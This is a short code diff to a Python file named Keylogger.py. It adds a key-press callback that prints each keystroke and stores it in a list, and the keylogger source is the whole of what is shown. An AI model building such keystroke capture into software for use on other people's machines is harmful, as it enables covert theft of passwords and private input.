@@ -33,4 +33,11 @@ file_path = "D:\\KeyGaurdian_project\\Keylogger.py"
 extend = "\\"
 
 count = 0
-key = []
+keys = []
+
+def on_press(key):
+    global keys,count
+
+    print(key)
+    keys.append(key)
+    count += 1
